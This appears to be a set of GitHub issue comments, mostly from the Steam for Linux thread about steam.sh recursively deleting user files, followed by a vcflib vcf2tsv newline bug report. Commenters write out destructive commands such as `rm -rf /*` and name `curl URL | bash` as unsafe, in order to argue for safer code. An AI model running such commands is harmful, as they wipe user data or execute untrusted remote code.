@Tele42  and @johnv-valve I would also worry about the risk of `$STEAMROOT` being `/`, `*`, `.`, `..` etc (Symbols that have meanin on *NIX systems, basically) or a system folder (`/opt`, `/home`, `/usr` etc., obviously including User's home folder). Not that I would manually write checks for every possibility, I would first study on the matter to see which values could end up there, and how to best ""sanitize"" the variable, so to speak. i.e., if there's a flag to protect system folders, I would use it. If `*` only adds to the risk (Better Git Blame that to be sure it is not needed though, could be a fix for some other edge case), I would remove it. And so on.

The best fix seems to be checking the folder for some specific file(s), but that coupled with manual checks for `$STEAMROOT` and some flags to protect system files becomes pretty safe. It CAN go wrong, as everything on a computer (The nature of bugs), but at least the script ""does its best"" to avoid it, which I believe is what we all want: To feel the software we run tries to preserve us, our systems and our files.
"
6474	"@frnco 

> Do you go to your clients to code on their computers whenefer you find a bug...? Or do you just tell them you can't reproduce...?

I think that's what he's doing when he asks for help with reproducing the bug. I'm afraid I don't understand what you're getting at.
"
6475	"@rpdelaney I'm getting at ""`rm` should be dealt with more care, especially if the script is too big and you can't unit-test it.""

`rm-rf /*` is just a bit worse than `rm -rf ./*` or `rm -rf ../*` and so on.
It's a bit like protecting against race conditions: Never running on them is not enought reason to not try to protect against them. If there's a chance it could happen, as slim as it may be, you code in a way to prevent it. If you parse one file of 20b in one thread and another file of 200Mb on another thread, you don't just assume both files are finished after the 200Mb file finished, you check for both, even if it's a problem that won't surface under any normal circumstances.

Dealing with a bash script this big and confusing feels remarkably close to that. Feels like everything work, but an unchecked `rm` still erased a ton of files. Classic example where ""better safe than sorry"" could have prevented it with a handful of `if`s. Ugly, perhaps, but safer. And since the script is already a mess, I don't see any reason not to add more and better checks, as many of the previous commenters.
"
6476	"Is it strictly necessary to do `rm -rf ""$STEAMROOT/""*`?  
Why not `rm -rf ""$STEAMROOT""; mkdir ""$STEAMROOT""`?

```
[[ -d ""$STEAMROOT"" ]] && {
    rm -rf ""$STEAMROOT""
    mkdir ""$STEAMROOT""
}
```

It will create a case where if ""$STEAMROOT"" is a symlink, we will remove it and put the new files in there. But:  
1. There is little reason to symlink the whole dir.
2. The user should know what they did and what that implies.
3. We drastically reduce the chances for something to go wrong.
4. We could warn the user of the fact that $STEAMROOT is a symlink and let them deal with it.

And please consider hardcoding the path to ""$HOME/.local/share/Steam"":

```
if [[ ""$XDG_DATA_HOME"" ]]; then
    STEAMROOT=""$XDG_DATA_HOME/Steam""
else
    STEAMROOT=""$HOME/.local/share/Steam""
fi
```

Or just:

```
STEAMROOT=""$HOME/.local/share/Steam""
```
"
6477	"@ftp: Having a symlink is necessary when %HOME is too small or if it would be insane to use the SSD for games.
"
6478	"As I said before, this argument should be included: `--preserve-root`.
"
6479	"@7eggert

> Having a symlink is necessary when %HOME is too small or if it would be insane to use the SSD for games.

No. Use `mount -o bind`.
"
6480	"@johnv-valve you should just lock this thread. Obviously people haven't
picked up on the whole ""not a general discussion forum"".

On Thu, Jan 22, 2015 at 11:12 AM, Julian Ospald notifications@github.com
wrote:

> Having a symlink is necessary when %HOME is too small or if it would be
> insane to use the SSD for games.
> 
> No. Use mount -o bind.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/ValveSoftware/steam-for-linux/issues/3671#issuecomment-71045646
> .
"
6481	"mount -o bind requires root privileges. The point of using $HOME is not to require root privileges, otherwise you'd use /var/lib/Steam.

Besides, it's system specific.
"
6482	"@7eggert, you can also tell Steam where you want your games installed. It is entirely possible to set a custom SteamApps location in settings.

I'm sorry for contributing to the offtopic, it will be the last time I do this.
"
6483	"Q: How many developers take to fix a bug in a shell script?
A: 115 participants so far, still unfixed.
"
6484	"Lets move the discussion [to the Steam for Linux group discussion post](http://steamcommunity.com/app/221410/discussions/2/620703493318321646/).
"
6485	"it is already fixed.
http://store.steampowered.com/news/15512/
"
6486	"...is there anyone in the world who uses Steam on a linux machine where they can't escalate to root to make necessary configuration changes?
"
6487	"@mwestphal : @johnv-valve stated the following:

> We shipped a one-line fix to avoid the one situation where we could reproduce the problem. We are still working on some more comprehensive changes, but we wanted to get a fix out there quickly in case this somehow hit anybody else.
> 
> If anybody knows how to actually reproduce this bug, please post the steps here or email me directly. So far we have not been able toe reproduce it and I would hate to be barking up the wrong tree if the problem is really somewhere else.
> 
> Also, I'd appreciate it if people would not use this bug report as a general discussion and debate forum. I don't want to lock the thread, but it is pretty hard to separate out the noise at this point. Thanks!

This potentially only a partial fix; discussion has been moved to the Steam forums.  There the community can discuss and review the ""one-line fix"" and see if any suggestions can be offered.
"
6488	"Solution: Just don’t delete user data. Ever.
"
6489	Has this issue not been fixed yet? If it has been fixed, it should be closed. If it is not fixed, it needs more attention.
6490	Yes, the issue that is tracked in this issue report was resolved.
6491	"kisak-valve said that this is resolved.  It's not, the ""fix"" doesn't do anywhere near enough sanity checking for a script that has the potential to delete the user's files.

Here's what I consider to be the absolute minimum level of sanity checking required:

(This script was written by me and is hereby placed in the public domain, or the 2-clause BSD license if you are in a jurisdiction that does not acknowledge ""public domain"".  Do **whatever** you want with it, no royalties or any form of compensation or acknowledgement is expected or required, even the BSD license requirement to include a copyright notice is waived.  I renounce all rights to this trivial code)

```
$ cat /tmp/steamhome.sh 
#!/bin/bash

# Example of a minimal fix for:
# https://github.com/valvesoftware/steam-for-linux/issues/3671
#
# Notes:
# 0. This script is public domain or, at your option, BSD-licensed.
# 1. The steam.sh script has 'STEAMROOT=""$(cd $(dirname $0) && echo $PWD)""'
#    WTF! that's crazy.  assignment by side-effect (and hoping the `cd` doesn't fail),
#    is just tempting Murphy, and whoever wrote it doesn't know bash's built-in `pwd`
#    returns the current dir, as does `/bin/pwd` which has existed for decades.
# 2. in case it ever matters, FreeBSD's `stat` command is not the same as GNU's and has
#    slightly different printf-style formatting options, and their `readlink` only has
#    a `-f` option rather than `-e`, but that's adequate for this job.

STEAMDEBUG=1

dumpsteamvars() {
  # if $STEAMDEBUG is 1 display all env vars with 'STEAM' in the name
  [ ""$STEAMDEBUG"" == '1' ] && typeset -p  | grep STEAM
}

error() {
  # This function takes either 1 or 2 arguments, a message to print to stderr
  # (required), optionally preceded by an exit code (defaults to 1 if missing)

  local exitcode=1
  [ -n ""$2"" ] && exitcode=""$1"" && shift

  printf ""FATAL: %s\n"" ""$1"" >&2

  dumpsteamvars

  exit $exitcode
}

# SteamOS is Linux, so we can assume GNU coreutils, which includes basename,
# dirname, readlink, id, stat, etc.

# base name of the script, i.e. without the path.
STEAMCMD=""$(basename ""$0"")""
[ -z ""$STEAMCMD"" ] && error 1 ""STEAMCMD is empty""

# 'readlink -e' canonicalises the path/filename, resolving all symlinks
STEAMROOT=""$(dirname ""$(readlink -e ""$0"")"")""
[ -z ""$STEAMROOT"" ] && error 2 ""STEAMROOT is empty""
cd ""$STEAMROOT""

STEAMUSER=""$(id -u -n)""                       # login name of the user running steam
STEAMUID=""$(id -u)""                           # numeric uid of that user
STEAMROOTUID=""$(stat -c '%u' ""$STEAMROOT"")""   # numeric uid of $STEAMROOT directory's owner.
STEAMROOTOWNER=""$(id -u -n ""$STEAMROOTUID"")""  # login name of $STEAMROOT directory's owner.

# now check for some problems that could lead to disaster and
# abort on anything even slightly dodgy.
[ -z ""$STEAMUSER""                ] && error 3 ""STEAMUSER is empty""
[ -z ""$STEAMUID""                 ] && error 4 ""STEAMUID is empty""
[ -z ""$STEAMROOTUID""             ] && error 5 ""STEAMROOTUID is empty""
[ ""$STEAMUID"" != ""$STEAMROOTUID"" ] && error 6 ""$STEAMROOT owned by $STEAMROOTOWNER($STEAMROOTUID).  STEAMROOT should be owned by $STEAMUSER($STEAMUID)""
[ ! -e ""$STEAMROOT/$STEAMCMD""    ] && error 7 ""Something very odd is going on, can't find myself ($STEAMCMD is not in $STEAMROOT)""

# put more sanity checks here

echo ""Everything seems to be OK""
dumpsteamvars
```

If I save this as `/tmp/steamhome.sh` and run it, I get:

```
$ /tmp/steamhome.sh 
FATAL: /tmp owned by root(0).  STEAMROOT should be owned by cas(1000)
declare -- STEAMCMD=""steamhome.sh""
declare -- STEAMDEBUG=""1""
declare -- STEAMROOT=""/tmp""
declare -- STEAMROOTOWNER=""root""
declare -- STEAMROOTUID=""0""
declare -- STEAMUID=""1000""
declare -- STEAMUSER=""cas""


```

Exactly what it's supposed to do.  If I copy it to `~/.steam/` and run it, I get:

```
$ cp /tmp/steamhome.sh ~/.steam/
$ ~/.steam/steamhome.sh 
Everything seems to be OK
declare -- STEAMCMD=""steamhome.sh""
declare -- STEAMDEBUG=""1""
declare -- STEAMROOT=""/home/cas/.steam""
declare -- STEAMROOTOWNER=""cas""
declare -- STEAMROOTUID=""1000""
declare -- STEAMUID=""1000""
declare -- STEAMUSER=""cas""
```

Again, exactly what it's supposed to do.

And, thanks to `readlink -e`, if `~/.steam/steamhome.sh` is a symlink to e.g. `/tmp/steamhome.sh`:

```
$ ln -sf /tmp/steamhome.sh ~/.steam/
$ ~/.steam/steamhome.sh 
FATAL: /tmp owned by root(0).  STEAMROOT should be owned by cas(1000)
declare -- STEAMCMD=""steamhome.sh""
declare -- STEAMDEBUG=""1""
declare -- STEAMROOT=""/tmp""
declare -- STEAMROOTOWNER=""root""
declare -- STEAMROOTUID=""0""
declare -- STEAMUID=""1000""
declare -- STEAMUSER=""cas""
```
"
6492	"You are always welcomed to use a containerized Steam (no performance impact) in case you afraid it can damage anything on your system, except the Steam-related files itself of course --
 https://hub.docker.com/r/andrey01/steam/"
6493	"Always put Steam in a 32 bit chroot in order to run it on a recent system (64 bits of course). Only game devs want 32 bit nowadays so a chroot is necessary anyways if you don't want to clutter your system with a shitload of multiarch stuff.

If you prevent steam from deleting all your data that's a bonus, too."
6494	In fact containers and chroot are very secure, but isn't the best option from user's POV. An application which sane scripts which doesn't delete all your files still is the best option. May be one day when Flatpak and Snap become a standard we can rethink this.
6495	"> @mhalano You have to consider that many devs on steam stop supporting Linux because they say ""1% of our customers use Linux but they account for 50% of our support requests"". In view of this steam should be distributed as a container to keep as much of the environment under control as possible.

Source?"
6496	"> An application which sane scripts which doesn't delete all your files still is the best option.

Yes, of course. But as long as the software needs 32 bit libs I'm not going to run it outside a chroot/container/whatever. I don't want to clutter my system with multiarch crap."
6497	"> ""1% of our customers use Linux but they account for 50% of our support requests""

No surprise. Most of players on Windows are kids, most of players on Linux are programmers. Also these are ""bug reports"" and not ""support requests""."
6498	"> @mhalano You have to consider that many devs on steam stop supporting Linux because they say ""1% of our customers use Linux but they account for 50% of our support requests"". In view of this steam should be distributed as a container to keep as much of the environment under control as possible.

Yeah, it is really a big problem for content creators to have an engaged audience. /s"
6499	@ohjames, but it could. There isn't a lot of finality either way without more data. These users could be finding valid bugs, in which case they are doing the developers a service.
6500	"> An engaged audience does not equate to a large number of support requests.

Bug reports aren't support requests."
6501	"So some random guy said ""An engaged audience does not equate to a large number of support requests""  twice but I have no idea why this truism is being repeatedly asserted?"
6502	"> no they didn't, and you're being neither funny nor clever.

@ohjames He's just treating you with your own medicine.
Using some random dev's made up percentage fud as a fact is no better than [what](https://twitter.com/garrynewman/status/690531015325016064) Garry Newman does.

But I guess now that you deleted your comments people can't actually support any of this, right?
Right, cause deleting your comments is definitely going to end this convo (whether you're being _harassed_ justly or wrongfully).

In any case, this is all off-topic, isn't that so?"
6503	@kisak-valve please can you lock this? It's getting really off-topic here.
6504	@simi, the issue is closed, but not fixed as well as it should be. Locking it is going to keep the issue from being re-opened and actually resolved.
6505	"I'd rather not lock issue reports if I don't need to. At this point, I'd need either a test case that causes this issue or a request from a Steam dev to re-open this issue.

Since there is over a hundred participants on this issue report, I'd like to see at least 25 thumbs up on @simi's request to lock this issue."
6506	If Valve properly fix the problem (is not that hard) the off-topic messages go away.
6507	@kisak-valve, @craig-sanders has shown a fix here: https://github.com/ValveSoftware/steam-for-linux/issues/3671#issuecomment-328726591
6508	"> @kisak-valve, @craig-sanders has shown a fix here: #3671 (comment)

Sorry, but none of you really understand the problem. The problem is not the lack of arbitrary sanity-checks, the problem is that __recursive__ deletion is an inherently problematic operation, especially if it is non-interactive. That is also why no package manager out there will ever do `rm -r` in any way. You __track__ the installed files and only __ever__ remove __known files__, never directories and never recursive."
6509	"@kisak-valve issue was marked as closed (and by your comment also as resolved) and it is here just for annoying offtopic discussion. I don't see any reason to keep it unlocked and keep offtopic discussion. I would like to stay watching this issue, but I don't care about offtopic.

Once there will be news, you can:

1. unlock
2. comment as member (even it is locked)

and interested people will get notification."
6510	"I don't know if they enjoy the publicity and free labor or what but Valve will never fix problems like this, seriously there are many threads like it on github alone.     Looking at steam.sh should make anyone cry in a corner.

There are lovely assumptions like this all over the place:

```
 # Save the prompt in a temporary file because it can have newlines in it
    tmpfile=""$(mktemp || echo ""/tmp/steam_message.txt"")""
```

That is so wrong on so many levels but they've hardcoded things everywhere.   I can only imagine what the Windows client is like.

This one just boggles my mind:

```
    # Set up the link to the source code
     ln -sf ""$STEAM_RUNTIME/source"" /tmp/source
     else
          echo $""STEAM_RUNTIME couldn't download and unpack $STEAM_RUNTIME_DEBUG_URL, falling back to $STEAM_RUNTIME""

```

Look around those lines and cry.  The RUNTIME_DEBUG_URL is based on a grep with no error checking.  Isn't even over SSL.  Rather hilarious thing is they explicitly force http1.0 in download_archive anyway.

My point is there are so many places this bug can surface it's no wonder Valve are unable to fix it.  I wouldn't personally go near a LAN with steam running."
6511	Conclusion: They have absolutely no idea how to develop software for Linux-based operating systems.
6512	"> Conclusion: They have absolutely no idea how to develop software for Linux-based operating systems

That is correct. And it's not even so much about the poor quality shell scripting. They don't use the opensource community to their benefit. They have no understanding of the ecosystem or the community.

There are lots of people out there that would rewrite their scripts for free and even collaborate on linux-specific steam code. Apart from the tons of suggestions here, there have also been numerous PRs about making the scripts POSIX compatible and whatnot. They have been ignored.

Linux is basically a platform where you get reviews, suggestions, code and even professional help for free. Except valve doesn't use it. That's not really a problem of ""oh, I let my grandma write the bash scripts that handle safe user data removal"", it's your huge ignorance of the specificities of a platform and its community. Something went wrong during your ""linux agenda""."
6513	But it totally makes sense given the way Valve works internally. There was employee or a group that made the project, but now they are either not interested in it or not even employed anymore. Who will merge PRs, if nobody knows the code?
6514	"@hasufell yes, keeping track of all files and deleting only known files when uninstalling is what a package manager **should** do.

Steam doesn't do that, and likely never will.  Steam isn't a real package manager.  It's a game library manager originally written for an OS where package management is an alien concept, where each program is installed by running its own installer program (and assumes it's the only program that will ever run on the system so can do whatever TF it wants to without caring about screwing up other software the user may have installed)....For all its flaws, Steam on windows is actually a great leap forward compared to that even if it does seem primitive and broken compared to standard practice on linux or mac.   Hell, even on Linux you still get idiot devs telling users to ignore the package manager and just run `make install` or the insanely insecure `curl URL | bash`.

Anyway, as always, it's more useful to deal with things as they are, not as they would be in an ideal world. Without the magic ability to make steam work like a real package manager, having a bunch of paranoid sanity checks in front of anything that affects file deletion is the most useful thing to do....equalled only by:

1. fixing all the shell coding mistakes, including:
  * The `$""` pointed out by @h1z1.  That is not the only instance - there are 21 more in my copy of steam.sh as of today. `$""` is valid syntax in bash but I doubt very much that the script author's purpose was to do [locale translation](https://unix.stackexchange.com/questions/334760/how-to-use-locale-specific-translation-in-bash).
  * failure to consistently and properly double-quote variables
  * use of backticks rather than `$()`.  and failure to double-quote `$()`.

2. carefully examine every instance of `rm -r` in the script (7 according to `grep -c`) and make sure they're as safe as possible given the hackish nature of the script.  Perhaps even write a `safe_rm` wrapper function that does some sanity checking (e.g. existence and ownership of dir), before doing a recursive deletion, and use that wherever `rm -r` is run.

3. the many newbie errors like:
  * `#!/usr/bin/env bash`.  bash is always in /bin on a linux system, also on OS X.  and using env to find a script interpreter is brain-damaged.
  * piping grep into grep and then into awk - this is never necessary as awk can do regular expression pattern matching all by itself, e.g. (simplified version of steam.sh line 594):
    `ldd ""$1"" | grep X | grep -v Y | grep -v Z | awk '{print $1}'`
    is better written as
    `ldd ""$1"" | awk '/X/ && ! /Y|Z/ {print $1}'`
    or perhaps even
    `ldd ""$1"" | awk '/not found/ {print $1}'`
    since that seems to be the purpose of that line.
  * failure to program defensively - i.e. don't assume anything about the environment.  a Q&D hack may be OK on someone's personal system, but not for code intended for distribution to others.

These mistakes and newbie errors are just what I've noticed from a casual glance at the script.  There are undoubtedly many more."
6515	"> bash is always in /bin on a linux system, also on OS X.

Many Linux distros store it in /usr/bin instead, along with everything else that usually goes in /bin."
6516	"> Steam doesn't do that, and likely never will. Steam isn't a real package manager.

You missed the point. It isn't actually that hard for a program to keep track of all the files it will output in a given directory. Even programs on windows are able to do that sort of thing. No one said steam should become a package manager. It should just be able to clean up after itself and while it is updating."
6517	"@aaronfranke really?  name these ""many distros"".  in fact, name one.  bash has been in /bin on linux forever because that's where system-native shells belong.  third-party shells tend to go in /usr/local/bin.  or in some bizarre location like /usr/opt/local/where/the/fuck/is/it on solaris.

@hasufell no, i didn't miss your point. you missed mine, which is that wasting time complaining about the fact that steam isn't a real package manager and doesn't behave like one is completely pointless and useless.  Deal with things as they are, not as they should be and not as you wish they were.  Steam is what it is, and there's a limit to what and how much can be fixed or improved.
"
6518	"> which is that wasting time complaining about the fact that steam isn't a real package manager and doesn't behave like one is completely pointless and useless.

No, that's not what I said. Package managers are orthogonal to the point I made, which suggests you actually didn't understand the point.

> Deal with things as they are, not as they should be and not as you wish they were. Steam is what it is, and there's a limit to what and how much can be fixed or improved.

That is just wild guessing. Why would it not be possible to fix the behavior as explained? I don't see any technical limit there. Please explain what ""limit"" that would be."
6519	"you may think you were making some significant point, but really you were just wishing that steam was a real package manager.  It isn't, and no amount of bitching about it is ever going to get Valve to devote the time and resources to make it one.  There's little or no benefit to them in doing so - steam mostly functions well enough at what it is, a games library manager.

as for your ""wild guessing"" comment and request for an explanation of the limit - we're talking here about the steam.sh shell script, which is a wrapper around the steam application, doing environment setup and other things (like helpfully deleting all user files on certain error conditions).  Rewriting the steam app so that it acts like a package manager should is **way** beyond the scope of fixing the obvious errors in a shell script.  I would have thought that was obvious.

In case you hadn't noticed, Valve don't even acknowledge the fact that their crappy steam.sh script is still broken and puts user files at risk - there's some small hope that they might eventually do that and adopt some of the ideas and suggestions in this thread (there's some evidence they've already done that for some things), but there's no way they'll ever re-write the steam app to incorporate the basic features of a package manager.
"
6520	"> you may think you were making some significant point, but really you were just wishing that steam was a real package manager

Again, no.

> as for your ""wild guessing"" comment and request for an explanation of the limit - we're talking here about the steam.sh shell script

No, we are talking about steam as a whole.

> Rewriting the steam app so that it acts like a package manager should is way beyond the scope of fixing the obvious errors in a shell script. I would have thought that was obvious.

Again, no. This is not about package managers. You seem to have no understanding of how the proposed technology works.

This is not about fixing half-assed shell scripts, which are already by concept wrong. This is about __correctness__, which is crucial when you deal with user files. Recursive deletion is __never__ correct from an automated cleanup POV. Recursive deletion is something a user may trigger, based on his needs.

> but there's no way they'll ever re-write the steam app

First, there is no rewriting of the ""steam app"" involved. Second, that's guessing again."
6521	"@craig-sanders

https://www.freedesktop.org/wiki/Software/systemd/TheCaseForTheUsrMerge/

Solaris started it, Fedora was one of the first Linux distros to do it."
6522	"> @aaronfranke really? name these ""many distros"". in fact, name one. bash has been in /bin on linux forever because that's where system-native shells belong. third-party shells tend to go in /usr/local/bin. or in some bizarre location like /usr/opt/local/where/the/fuck/is/it on solaris.

@craig-sanders: Sorry to barge in, but maybe you have to update your knowledge on this one:

- Fedora: `/usr/bin/bash` (https://koji.fedoraproject.org/koji/rpminfo?rpmID=11161824)
- ArchLinux: `usr/bin/bash` (https://www.archlinux.org/packages/core/x86_64/bash/)

And probably others already, as this merge of /bin to /usr/bin was advocated by systemd, so probably many other distros that switched to systemd will eventually follow."
6523	"No big deal since the merge to /usr/bin is done slowly and places symlinks for maintaining backwards compatibility.

![2017-10-15-194019_499x65_scrot](https://user-images.githubusercontent.com/1668792/31587316-f2138d42-b1df-11e7-87fc-c9d4899166fe.png)

So using `/bin/bash` is safe on “traditional” systems as well as on nowadays systems."
6524	Guys, we are bike shedding solving a problem which has already had a suitable solution presented and alternatives. Discussing it ad nauseam isnt going to make Valve come out and fix it if they have no interest, we have suitably voiced opinion here. Lets post a link to some other forum (Reddit, Google groups, or elsewhere) and take the sidebar discussion there. 
6525	"> No big deal since the merge to /usr/bin is done slowly and places symlinks for maintaining backwards compatibility.
> So using /bin/bash is safe on “traditional” systems as well as on nowadays systems.

This may be true so far, but every backwards compatibility will eventually be going away.
And this:

> #!/usr/bin/env bash. bash is always in /bin on a linux system, also on OS X. and using env to find a script interpreter is brain-damaged.

is certainly outdated advice for any software maintained currently or in the future. Distributions will have to do enough patching for legacy software once such backwards compatibility is faded out."
6526	 @ju2wheels But a Half Life 3 talk didn't even have a chance to start!
6527	Has this problem been fixed? I really want to play the metro series, but this scares the crap out of me.
6528	@user15177 Set up a chroot for Steam and run it from there so it can do no harm to your actual system.
6529	@craig-sanders Since you posted some cleaned-up code from the script and some good Bash scripting advice, a note: Always use the `[[ ]]` test syntax in Bash-specific scripts.  It's safer and cleaner in all cases.
6530	Can Confirm this issue Existant on all GNU/Linux Distros that have Users and Steam support.
6531	Can confirm this happened to a innocent account of mine. I never cheated and I do not associate with cheaters _lol_ and this is very sad that this is happening.
6532	"![asdf](https://i.imgur.com/wFw4F76.png)

Users named catbot are cheats now? It seems this change is undocumented, I wonder why?"
6533	I can confirm that this is infact true, I installed ubuntu on a virtual machine and named the computer catbot-918 and installed steam, within an hour of not playing anything I received a VAC ban.
6534	"Confirmed with one long-standing account and one fresh account, both under the same Linux username starting with ""catbot"".
But consider yourselves lucky! Valve have a history of hunting down users who don't adapt to policy changes and banning their accounts, often worth thousands of dollars, with no indication as to why. I have been caught in a ridiculous but unrelated permanent community and trade ban for trying to sell a large amount of items on the community market, even though Steam support never bothered to confirm this.
Don't be surprised when Steam support discard your ticket due to ""privacy policy"" issues. I know I wasn't."
6535	Why would anyone set the username to a known cheat? 
6536	@1157 WHY THE FUCK NOT, BRUH? What if I have bot network for other purposes and I want to play tf2. And I can't and I get ban on my account for literally nothing. What a stupid move @ValveSoftware
6537	"Good day, I've received word from the VAC team that this is intentional and not open for discussion on Github.

In general VAC issues are not handled on Github in any capacity and further issue reports on this may result in being banned from the Valve Software issue trackers."
6538	"@deniseduma I was unable to reproduce the ""bug"" you reported.  Here's an example of the test I ran.  There were two lines in the output, one for each alt alelle.

`bin/vcf2tsv samples/1kg-phaseIII-v5a.20130502.genotypes.chr22-16-16.5mb.vcf.gz | grep ""rs62224611""`

"
6539	"@deniseduma i find the tone of your writing to be aggressive and disrespectful. I believe Github follows the ""Open Code of Conduct"" (see http://todogroup.org/opencodeofconduct/) which I would argue you are not following here.

"
6540	"@deniseduma now back to your issue. did you copy the file between Windows or Mac and a Unix system by any chance?  This is a common problem with handling different line endings.
"
6541	"I'm using a Mac so most likely you are not handling the newline character correctly on the Mac. I'm sure I'm not wrong because I've tested this many times and compared your output with that of another tool which does not split records by alleles and the two outputs have exactly the same number of lines. 

I'm sorry if you were offended by my tone but I find your tool which apparently you published to be quite immature and bug-ridden. For instance, there was another bug when I tried to install vcflib on my Mac which took me forever to figure out!  In my opinion, the installation of the software at least should work smoothly. "
6542	Could you please provide an example input file that demonstrates this behaviour. If you're using a mac and 'hexdump' is also installed, the output of the last few lines of `hexdump -C <output_file>` (preferably mixing lines that have the problems and ones that don't) would also be informative.
6543	"Hi,

Here is an example input file, test.vcf, that has the problem and the
corresponding output test.tsv

The command I ran is

vcf2tsv test.vcf >test.tsv

I'm using MacOS 10.12


On Mon, Jul 31, 2017 at 9:35 AM, David Eccles (gringer) <
notifications@github.com> wrote:

> Could you please provide an example input file that demonstrates this
> behaviour. If you're using a mac and 'hexdump' is also installed, the
> output of the first few lines of hexdump -C <output_file> would also be
> informative.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/vcflib/vcflib/issues/206#issuecomment-318991616>, or mute
> the thread
> <https://github.com/notifications/unsubscribe-auth/ANM6sIfvEKuzNbzF9tcDHWtW4gYN8PrEks5sTYOkgaJpZM4OnvOm>
> .
>



-- 
Denise
"
6544	"@deniseduma 

1. I am not the author of the software. I am just a bioinformatician who helps people in my community wherever I can.

2. This software is NOT published in a journal as far as I know. It is only on Github.

3. You need to provide test data for the authors to replicate the bug. This is a good guide: https://www.chiark.greenend.org.uk/~sgtatham/bugs.html

4. I am not sure you are really ""sorry"" about your tone. 

5. You are clearly frustrated by this tool. There are alternatives out there, or a simple libraries for doing it yourself by parsing the VCF.

"
6545	"@deniseduma there does not seem to be a `test.vcf` file attached?  it works best attaching it via the github web site rather then email.  does it work for you @gringer ?

I would try running `mac2unix`  on the original file and see if it fixes the problem."
6546	No, I'm not getting github emails about this, and also can't see any attachments on the issue page.
6547	"That's because I've attached them to my email, I didn't realize that you
cannot make use of email attachments!

On Mon, Jul 31, 2017 at 10:08 AM, David Eccles (gringer) <
notifications@github.com> wrote:

> No, I'm not getting github emails about this, and also can't see any
> attachments on the issue page.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/vcflib/vcflib/issues/206#issuecomment-318998001>, or mute
> the thread
> <https://github.com/notifications/unsubscribe-auth/ANM6sCzOYHZ0MaLoY5HpVHT2e952RRCLks5sTYtwgaJpZM4OnvOm>
> .
>



-- 
Denise
"
6548	"Here are the input and output files, I've changed their extension to .txt because Github won't let me upload as .vcf and .tsv




[test_tsv.txt](https://github.com/vcflib/vcflib/files/1186892/test_tsv.txt)
[test_vcf.txt](https://github.com/vcflib/vcflib/files/1186893/test_vcf.txt)

"
6549	"It looks like you uploaded the same file. After I downloaded them, these files were identical.

Edit: I think what I did wrong with the download was to just replace the file name, rather than the file number. github doesn't seem to care what the file names are set to. For example, here they are ""renamed"" to the correct extension:

https://github.com/vcflib/vcflib/files/1186892/test.tsv
https://github.com/vcflib/vcflib/files/1186893/test.vcf

In any case, I do see that there is no line break or carriage return character in the output:

```
00000000  23 43 48 52 4f 4d 09 50  4f 53 09 49 44 09 52 45  |#CHROM.POS.ID.RE|
00000010  46 09 41 4c 54 09 51 55  41 4c 09 46 49 4c 54 45  |F.ALT.QUAL.FILTE|
00000020  52 09 52 53 09 52 53 50  4f 53 09 64 62 53 4e 50  |R.RS.RSPOS.dbSNP|
00000030  42 75 69 6c 64 49 44 0a  31 09 39 34 39 35 32 33  |BuildID.1.949523|
00000040  09 72 73 37 38 36 32 30  31 30 30 35 09 43 09 54  |.rs786201005.C.T|
00000050  09 30 09 2e 09 37 38 36  32 30 31 30 30 35 09 39  |.0...786201005.9|
00000060  34 39 35 32 33 09 31 34  34 0a 31 09 39 38 35 38  |49523.144.1.9858|
00000070  32 36 09 72 73 31 37 31  36 30 37 37 35 09 47 09  |26.rs17160775.G.|
00000080  41 09 30 09 2e 09 31 37  31 36 30 37 37 35 09 39  |A.0...17160775.9|
00000090  38 35 38 32 36 09 31 32  33 31 09 39 38 35 38 32  |85826.1231.98582| << 123//1
000000a0  36 09 72 73 31 37 31 36  30 37 37 35 09 47 09 54  |6.rs17160775.G.T|
000000b0  09 30 09 2e 09 31 37 31  36 30 37 37 35 09 39 38  |.0...17160775.98|
000000c0  35 38 32 36 09 31 32 33  0a                       |5826.123.|
```"
6550	I've re-downloaded test_vcf.txt and test_tsv.txt that I've uploaded via the Github interface on my computer and they are different, the first is the .vcf file and the second is the resulting .tsv file, I'm not sure what files you find identical. 
6551	I confirm there are two different files.
6552	"Here's the C++ file for vcf2tsv, if you can see anything that would help the developers fix your issue that would be very helpful.

https://github.com/vcflib/vcflib/blob/master/src/vcf2tsv.cpp"
6553	I thought that the way this works is the users point out the issues and the developers fix them, not that the users both point out the issues and fix them by themselves! Besides, I'm not familiar with C++ so I cannot help. 
6554	"This is my first contribution to vcflib and I don't write C++ code. I'm not even using vcflib directly, though I guess some tools I use might. It took me about 5 minutes to find and fix this (see the pull request referenced above), maybe this is useful for you.

I would like to point out that you are mistaken in your impression on how ""this"" works. As a maintainer of multiple open source tools myself, here is my take:

People spend time writing software, and share it with other people in the hopes it will be useful.
If the software is useful, other people will start using it, and are happy that they don't need to implement all the functionality from scratch. If a bug is identified, users can file a bug report and/or fix the issue themselves. If the developers have some time to spare, they also try and fix reported bugs.

At no point in this interaction is a user entitled to a bug free software (check out the license, it says `THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.`). At no point in this interaction is it ok for anybody to yell at  or to be rude to anybody.

Free software empowers users because it places their copy under their own control, so they can go and fix problems themselves. If you want someone to yell at for software that doesn't work, buy a support contract.
"
6555	"What exactly makes you think that I have the time required to fix bugs in free software?? 

Have you thought that my job descriptions might entail many other responsibilities and after having spent the weekend trying to figure out 1. why the software installation fails and 2. why vcf2tsv doesn't output what it's supposed to output, I cannot afford to spend a workday on the same issue???  

I haven't yelled at anybody although I can tell I'm very frustrated and if a simple functionality like this turns out to have bugs, I don't want to think what other more complex features that vcflib is supposed to offer might look like! I was planning to use vcflib for my work but at this point, I don't think it's a safe decision anymore!  "
6556	But if you don't like this code, why don't you just write your own?
6557	"I appreciate that text communication is difficult, but this is how I read this: Your initial comment on this bug contains 5 exclamation marks and one dot, not counting the pasted output example. The subject contains three exclamation marks. That looks like yelling to me. I understand that you might be frustrated because you wanted to do something that looks easy, and turned out to be much more time consuming than initially thought. But that doesn't entitle you to unload the frustration on other people.

What exactly makes you think that the people who initially wrote the software they provide to you for free have the time to fix bugs? Have you thought that their job description might entail many other responsibilities?

I have no idea of the constraints on your time, but I'm willing to go out on a limb to say that it'll be faster to fix a bug or two in an existing implementation than to write a new one from scratch. But you're in the best position to decide this for yourself."
